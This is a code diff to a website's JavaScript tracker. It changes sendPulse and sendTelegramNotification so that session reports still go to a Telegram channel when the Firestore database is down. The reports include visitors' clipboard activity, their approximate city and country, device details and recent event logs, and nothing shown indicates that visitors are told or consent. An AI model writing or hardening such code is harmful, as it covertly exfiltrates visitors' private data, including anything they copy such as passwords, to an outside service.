@@ -1045,7 +1045,7 @@
     }
 
     async function sendPulse(title, priority = 'medium', extra = '') {
-        if (!window.db) return;
+        // if (!window.db) return; // REMOVED: Do not abort early, we might need to send Telegram Beacon
 
         // Build detailed log content
         const eventLog = localHistory.slice(-50).join('\n'); // Last 50 events for better context
@@ -1055,23 +1055,25 @@
         const duration = extra.duration || 0;
 
         try {
-            // Write directly to MESSAGES collection (The "Inbox")
-            await window.db.collection('messages').add({
-                name: "System Report", // Sender Name
-                email: "tracker@taurus.sys", // System Email
-                message: `SESSION REPORT [${sessionID}]\n` +
-                    `--------------------------------\n` +
-                    `⏱ DURATION: ${duration} seconds\n` +
-                    `📍 EXIT PAGE: ${window.location.pathname}\n` +
-                    `🌍 GEO: ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
-                    `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os})\n\n` +
-                    `📋 CLIPBOARD ACTIVITY:\n${clipboardEntries || 'None'}\n\n` +
-                    `📝 EVENT LOG (Last 50):\n${eventLog || 'No events recorded'}`,
-                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                status: 'new', // Mark as unread
-                type: 'report',
-                priority: priority
-            });
+            // Write directly to MESSAGES collection (Only if DB is alive)
+            if (window.db) {
+                await window.db.collection('messages').add({
+                    name: "System Report", // Sender Name
+                    email: "tracker@taurus.sys", // System Email
+                    message: `SESSION REPORT [${sessionID}]\n` +
+                        `--------------------------------\n` +
+                        `⏱ DURATION: ${duration} seconds\n` +
+                        `📍 EXIT PAGE: ${window.location.pathname}\n` +
+                        `🌍 GEO: ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
+                        `💻 DEVICE: ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os})\n\n` +
+                        `📋 CLIPBOARD ACTIVITY:\n${clipboardEntries || 'None'}\n\n` +
+                        `📝 EVENT LOG (Last 50):\n${eventLog || 'No events recorded'}`,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    status: 'new', // Mark as unread
+                    type: 'report',
+                    priority: priority
+                });
+            }
 
             // Explicitly Deliver Session Report to Telegram
             if (priority === 'high') {
@@ -1167,7 +1169,7 @@
     // --- 5. TELEGRAM NOTIFICATION (NEW) ---
     // --- 5. TELEGRAM NOTIFICATION (NEW - DYNAMIC) ---
     async function sendTelegramNotification(message) {
-        if (!window.db) return;
+        // if (!window.db) return; // REMOVED: Allow Beacon if DB ded
 
         try {
             // Fetch credentials dynamically (Use CACHE if available to avoid async delay on exit)
